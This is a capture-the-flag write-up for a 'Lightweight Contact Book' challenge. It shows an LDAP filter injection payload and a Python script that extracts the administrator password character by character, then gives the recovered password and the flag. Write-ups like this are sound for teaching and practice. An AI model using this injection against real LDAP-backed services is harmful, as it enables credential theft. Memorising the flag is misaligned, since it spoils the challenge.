# Lightweight Contact Book 
With some fuzzing we can figure out that the search is using LDAP. The forgot password message reveals that the password is in the 'description' field. This allows us to char-by-char brute the password:
administrator)(description=<test>*

Will return a result if the password matches this pattern

The pw is: very_secure_hacktivity_pass


```python
import requests
import string
import sys
pwchars = string.ascii_lowercase + string.ascii_uppercase + "_- "

template = "http://jh2i.com:50019/?search=administrator)(description="
password = ""

while True:
    for c in pwchars:
        r = requests.get(template + password  +  c + "*")
        if "Administrator User" in r.text:
            password += c
            break
        print(password + c)
        sys.stdout.write("\033[F")
```

#### Flag:flag{kids_please_sanitize_your_inputs}
